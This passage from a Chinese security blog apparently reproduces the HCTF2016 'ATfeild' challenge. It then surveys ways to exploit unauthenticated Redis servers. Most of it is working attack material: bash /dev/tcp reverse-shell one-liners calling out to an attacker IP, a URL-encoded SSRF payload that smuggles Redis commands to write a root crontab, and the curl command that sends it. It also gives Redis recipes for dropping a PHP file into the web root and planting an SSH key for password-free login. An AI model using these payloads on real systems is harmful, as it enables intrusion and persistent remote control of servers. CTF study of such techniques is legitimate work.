+<p style="max-width:100%;height:auto;">正常我们在bash下反弹shell是这样子的命令</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">/bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1
+</code></pre>
+<p style="max-width:100%;height:auto;">写成计划任务形式，即crontab文件形式</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1
+</code></pre>
+<p style="max-width:100%;height:auto;">代表每分钟执行一次。具体写法google把。</p>
+<p style="max-width:100%;height:auto;">通常来说我们在使用redis写文件一半写法如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">set 11 "*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1"
+
+config set dir /var/spool/cron
+
+config set dbfilename root
+
+save
+</code></pre>
+<p style="max-width:100%;height:auto;">但是这里不能这样写，因为redis直接这样子，字符串中的空格在传输的时候事没有办法解决的，用单引号也没有办法写入。但是这个时候可以换一种写法</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">（1） set 11 "\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/104.160.43.154/12345 0&gt;&amp;1\n"
+
+（2）如下：
+
+------------------------------------------------------------------------------------------------------
+
+*3      //表示有三个参数
+$3     //下面这个参数长度为3
+set
+$1     //下面这个参数长度为1
+a       
+$64   //下面这个参数长度为64
+\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/104.160.43.154/12345 0&gt;&amp;1\n
+------------------------------------------------------------------------------------------------------
+</code></pre>
+<p style="max-width:100%;height:auto;">这里<code style="max-width:100%;height:auto;">\n</code>在传输的时候替换成%0a，所以我们要传入的明文子串如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">link=http://www.104.160.43.154.xip.io/302.php?url=http://172.17.0.4
+
+*3
+$3
+set
+$1
+a
+$64
+
+*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/104.160.43.154/12345 0&gt;&amp;1
+
+config set dir /var/spool/cron
+config set dbfilename root
+save
+:6379/
+</code></pre>
+<p style="max-width:100%;height:auto;">然后进行url编码，这里对换行符进行url是%0a，但是我们需要的是%0d%0a，所以编码时候要手动替换下</p>
+<p style="max-width:100%;height:auto;">编码后如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">link=http%3A%2f%2fwww.104.160.43.154.xip.io%2f302.php%3Furl%3Dhttp%253A%252f%252f172.17.0.4%25250d%25250A%25250d%25250A%25252a3%25250d%25250A%2525243%25250d%25250Aset%25250d%25250A%2525241%25250d%25250Aa%25250d%25250A%25252464%25250d%25250A%25250a%25252a%25252f1%252520%25252a%252520%25252a%252520%25252a%252520%25252a%252520%25252fbin%25252fbash%252520-i%252520%25253E%252526%252520%25252fdev%25252ftcp%25252f104.160.43.154%25252f12345%2525200%25253E%2525261%25250a%25250d%25250Aconfig%252520set%252520dir%252520%25252fvar%25252fspool%25252fcron%25250d%25250Aconfig%252520set%252520dbfilename%252520root%25250d%25250Asave%25250d%25250A%253A6379%252f
+</code></pre>
+<p style="max-width:100%;height:auto;">在vps上监听12345端口之后，然后执行如下命令</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl -d "link=http%3A%2f%2fwww.104.160.43.154.xip.io%2f302.php%3Furl%3Dhttp%253A%252f%252f172.17.0.4%25250d%25250A%25250d%25250A%25252a3%25250d%25250A%2525243%25250d%25250Aset%25250d%25250A%2525241%25250d%25250Aa%25250d%25250A%25252464%25250d%25250A%25250a%25252a%25252f1%252520%25252a%252520%25252a%252520%25252a%252520%25252a%252520%25252fbin%25252fbash%252520-i%252520%25253E%252526%252520%25252fdev%25252ftcp%25252f104.160.43.154%25252f12345%2525200%25253E%2525261%25250a%25250d%25250Aconfig%252520set%252520dir%252520%25252fvar%25252fspool%25252fcron%25250d%25250Aconfig%252520set%252520dbfilename%252520root%25250d%25250Asave%25250d%25250A%253A6379%252f" "http://172.17.0.2:8001/show" -v -L
+</code></pre>
+<p style="max-width:100%;height:auto;">观察redis服务器如下图所示：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">a已经写入了，再看<code style="max-width:100%;height:auto;">/var/spool/cron/root</code>文件</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">果然我们的命令已经被放在了单独的一行里面。</p>
+<p style="max-width:100%;height:auto;">这个时候vps上获得了shell如下图所示：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这道题就到此结束</p>
+<h1 id="0x02redis"><strong>0x02 关于redis未授权访问的利用方式</strong></h1>
+<p style="max-width:100%;height:auto;">首先在乌云知识库的<code style="max-width:100%;height:auto;">papers/3062</code>有比较详细的介绍，我这里也搜集了一下做了个简单的汇总。其实说到底redis利用还是写文件好用。</p>
+<p style="max-width:100%;height:auto;">首先redis的安全策略如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">1、每一行都要使用分隔符(CRLF)
+2、一条命令用”*”开始，同时用数字作为参数，需要分隔符(“*1”+ CRLF)
+3、我们有多个参数时：
+      字符：以”$”开头+字符的长度（＂$4＂+CRLF）+字符串(“TIME”+CRLF)
+      整数：以”:”开头+整数的ASCII码(“:42”+CRLF)
+</code></pre>
+<p style="max-width:100%;height:auto;">除了redis自带命令行有很多方式向redis输入命令，实际直接向6379端口发送命令就可以了。</p>
+<p style="max-width:100%;height:auto;">如：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">redis-cli set bendawang &amp;apos;Bendawang&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">等价的如：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">echo -e  &amp;apos;*3\r\n$3\r\nSET\r\n$9\r\nbendawang\r\n$9\r\nBendawang\r\n&amp;apos; | nc 127.0.0.1 6379
+</code></pre>
+<p style="max-width:100%;height:auto;">再如：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">echo -e  &amp;apos;Bendawang&amp;apos; | redis-cli -x set bendawang
+</code></pre>
+<p style="max-width:100%;height:auto;">当然如果是远程的，就将<code style="max-width:100%;height:auto;">redis-cli</code>换成<code style="max-width:100%;height:auto;">redis-cli -h host -p port</code>即可。</p>
+<h3 id="21"><strong>2.1 爆破键值</strong></h3>
+<p style="max-width:100%;height:auto;">这个就不多说了，直接上字典爆破什么的。。。</p>
+<h3 id="22eval"><strong>2.2 eval执行命令</strong></h3>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">redis-cli EVAL "dofile(&amp;apos;/etc/hosts&amp;apos;)" 0 -h 172.17.0.4
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">能获取到部分鸡肋信息把。</p>
+<p style="max-width:100%;height:auto;">然后也可以执行lua命令，但是我们一把来说不会对redis数据库内部的东西感兴趣，如果感兴趣直接randomkey看就可以了。</p>
+<p style="max-width:100%;height:auto;">当然也可以利用服务器的<code style="max-width:100%;height:auto;">redis.sha1hex()</code>在他的机器上暴力跑sha-1。</p>
+<p style="max-width:100%;height:auto;">不过我们有更好的利用方式。这里也就不多说了。</p>
+<h3 id="23webshell"><strong>2.3 写webshell</strong></h3>
+<p style="max-width:100%;height:auto;">网上查到p神发的文章</p>
+<p style="max-width:100%;height:auto;">https://www.secpulse.com/archives/5357.html</p>
+<p style="max-width:100%;height:auto;">这里需要注意的是，如果是在<code style="max-width:100%;height:auto;">ubuntu</code>系统下，全版本的系统写出来的文件都是<code style="max-width:100%;height:auto;">660</code>的权限，即通过web服务器事没有办法访问的</p>
+<p style="max-width:100%;height:auto;">但是<code style="max-width:100%;height:auto;">centos6</code>和<code style="max-width:100%;height:auto;">centos7</code>写出来的权限是<code style="max-width:100%;height:auto;">644</code>，即服务器可以访问，可以写webshell。</p>
+<p style="max-width:100%;height:auto;">另外注意是找那些猜想是777权限的目录写webshell，不然权限问题写不了。</p>
+<p style="max-width:100%;height:auto;">如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">config set dir /var/www/html/       //这里需要服务器绝对路径，可以根据服务器类型判断然后猜测常用的路径
+
+config set dbfilename bdw.php
+
+set a "&lt;?php phpinfo();?&gt;"
+
+sava    //也可以bgsave
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">如下所示：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h3 id="24crontabshell"><strong>2.4 写入crontab反弹shell</strong></h3>
+<p style="max-width:100%;height:auto;">之前介绍了，这里不多说了</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">redis-cli flushall    
+
+echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口 0&gt;&amp;1\n\n" | redis-cli -x set 1     
+
+redis-cli config set dir /var/spool/cron/     
+
+redis-cli config set dbfilename root     
+
+redis-cli save
+</code></pre>
+<h3 id="25sshkey"><strong>2.5 配合写ssh key，免密登陆</strong></h3>
+<p style="max-width:100%;height:auto;">这个的概率应该比较小吧。。</p>
+<p style="max-width:100%;height:auto;">原理是一样的</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">config set dir /root/.ssh/
+config set dbfilename authorized_keys
+set xxxx "这里写你的id_rsa.pub的值"
+
+save
+</code></pre>
+<p style="max-width:100%;height:auto;">然后直接通过ssh连上去就行了。</p>
+<p style="max-width:100%;height:auto;">估计基本上在第一句就会遭遇权限问题吧。。。毕竟/root一般都是<code style="max-width:100%;height:auto;">700</code>或是<code style="max-width:100%;height:auto;">740</code>或是<code style="max-width:100%;height:auto;">750</code>吧。</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./HCTF2016-ATfeild复现和对redis的利用的思考/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./HCTF2016-ATfeild复现和对redis的利用的思考/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./HCTF2016-ATfeild复现和对redis的利用的思考/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./HCTF2016-ATfeild复现和对redis的利用的思考/prism.js"></script>
+<script src="./HCTF2016-ATfeild复现和对redis的利用的思考/zooming.js"></script>
+<script src="./HCTF2016-ATfeild复现和对redis的利用的思考/Bendawang.js"></script>
+
+
